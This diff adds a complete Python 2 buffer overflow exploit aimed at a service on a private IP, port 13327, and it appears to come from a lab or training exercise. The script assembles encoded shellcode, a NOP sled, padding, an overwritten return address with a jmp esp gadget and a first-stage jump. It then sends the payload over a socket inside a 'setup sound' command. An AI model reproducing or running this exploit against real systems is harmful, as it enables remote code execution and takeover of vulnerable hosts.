@@ -1,0 +1,39 @@
+#!/usr/bin/python
+import socket
+
+target = "192.168.198.44"
+port = 13327
+
+shellcode =  b""
+shellcode += b"\xdb\xdf\xbf\x47\x42\xcb\xf7\xd9\x74\x24\xf4"
+shellcode += b"\x5e\x2b\xc9\xb1\x12\x31\x7e\x17\x03\x7e\x17"
+shellcode += b"\x83\x81\x46\x29\x02\x3c\x9c\x5a\x0e\x6d\x61"
+shellcode += b"\xf6\xbb\x93\xec\x19\x8b\xf5\x23\x59\x7f\xa0"
+shellcode += b"\x0b\x65\x4d\xd2\x25\xe3\xb4\xba\x75\xbb\x30"
+shellcode += b"\xfc\x1e\xbe\xbe\x01\x64\x37\x5f\xb1\xfc\x18"
+shellcode += b"\xf1\xe2\xb3\x9a\x78\xe5\x79\x1c\x28\x8d\xef"
+shellcode += b"\x32\xbe\x25\x98\x63\x6f\xd7\x31\xf5\x8c\x45"
+shellcode += b"\x91\x8c\xb2\xd9\x1e\x42\xb4"
+
+sled = "\x90" * 8 # nop sled
+
+padding = "\x41" * (4368 - len(sled) - len(shellcode))
+eip = "\x96\x45\x13\x08"
+first_stage = "\x83\xC0\x0C\xff\xE0\x90\x90"
+
+
+# \x00\x20
+# 0x08134596: jmp esp
+
+buffer = "\x11(setup sound " + sled + shellcode + padding + eip + first_stage + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[*]SENDING BUFFER[*]"
+
+s.connect((target,port))
+print s.recv(1024)
+
+s.send(buffer)
+s.close()
+
+print "[*]PAYLOAD SENT ... CLOSING[*]"
